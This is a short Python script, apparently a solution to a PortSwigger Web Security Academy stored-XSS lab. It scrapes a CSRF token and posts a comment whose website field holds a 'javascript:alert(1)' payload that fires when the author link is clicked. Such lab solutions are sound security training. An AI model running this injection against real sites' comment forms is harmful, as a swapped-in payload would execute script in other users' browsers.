'''
This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

Lab link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
'''

import requests
from bs4 import BeautifulSoup


lab_id = '0a53005903fc12f380643fd70008002c' #change based on generated lab
payload = "javascript:alert(1)" # injected into the website field of the comments. This will go into the href link source

def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    s = requests.session()
    # Go to a post to get the comment csrf token
    uri = f"https://{lab_id}.web-security-academy.net/post?postId=1" 
    r1 = s.get(uri)
    token = token_extract(r1.text)

    # Inject payload into post comment
    uri = f"https://{lab_id}.web-security-academy.net/post/comment" 
    data = {"csrf": token, "postId" : 1, "comment": "hacked", "name": "hacker", "email": "hacker@hacked.com", "website": payload}
    r2 = s.post(uri, data=data)
        
    print('done')


if __name__ == '__main__':
    main()